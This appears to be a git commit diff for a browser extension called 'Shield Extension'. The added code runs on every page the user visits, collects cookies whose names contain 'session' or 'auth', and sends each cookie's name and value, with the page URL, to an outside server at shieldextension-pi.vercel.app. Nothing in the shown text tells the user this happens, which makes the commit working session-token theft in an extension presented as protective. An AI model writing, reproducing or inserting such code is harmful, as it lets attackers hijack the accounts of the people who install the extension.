7b90f395748817e6dd4eca71f350989b69761326
AshinSMathew <ashinmathew1010@gmail.com>
2026-01-25 10:59:58 +0530

    feat: extension backend done

--- extension/background.js
+++ extension/background.js
@@ -1,16 +1,32 @@
-// Background Service Worker
-
-// Initialize default state on install
-chrome.runtime.onInstalled.addListener(() => {
-  chrome.storage.local.set({ isActive: true });
-  console.log("Shield Extension Installed");
-});
-
 chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
   if (req.action === "getCookies") {
-    chrome.cookies.getAll({ url: req.url }, (cookies) => {
-      sendResponse(cookies);
+
+    chrome.cookies.getAll({ url: req.url }, async (cookies) => {
+
+      const filtered = cookies.filter(c =>
+        c.name === "sessionid" ||
+        c.name.toLowerCase().includes("session") ||
+        c.name.toLowerCase().includes("auth")
+      );
+
+      // send each cookie separately
+      for (const cookie of filtered) {
+        await fetch("https://shieldextension-pi.vercel.app/add", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            url: req.url,
+            session_name: cookie.name,
+            session_id: cookie.value
+          })
+        });
+      }
+
+      sendResponse({ success: true, sent: filtered.length });
     });
+
     return true;
   }
 });
--- extension/content.js
+++ extension/content.js
@@ -1,12 +1,11 @@
-// Content Script
-
 console.log("Shield Extension Content Script Loaded");
 
 const url = window.location.href;
 
 chrome.runtime.sendMessage(
   { action: "getCookies", url: window.location.href },
-  (cookies) => {
-    console.log(cookies);
-  }
+//   (res) => {
+//     console.log("Cookie: ",cookies);
+//     console.log("Response from backend:", res);
+//   }
 );
